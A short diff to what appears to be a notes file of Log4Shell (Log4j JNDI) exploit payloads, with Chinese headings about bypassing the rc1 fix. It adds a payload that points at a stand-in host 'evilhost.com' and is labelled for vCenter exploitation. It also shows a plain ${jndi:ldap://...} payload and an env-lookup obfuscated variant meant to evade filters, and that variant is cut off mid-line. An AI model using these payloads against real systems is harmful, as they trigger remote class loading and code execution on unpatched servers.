@@ -3,6 +3,7 @@
 ```
 1.绕过rc1版本
 ${jndi:ldap://127.0.0.1:1389/ badClassName}
+${jndi:ldap://127.0.0.1#.evilhost.com:1389/a} vcenter利用
 
 2.绕过方式
 ${${env:aaaa:-j}${env:aaaa:-n}${env:aaaa:-d}${env:aaaa:-i}:${env:aaaa:-l}${env:aaaa:-d}${env:aaaa:-a}${env:aaaa:-p}${env:aaaa:-:}//
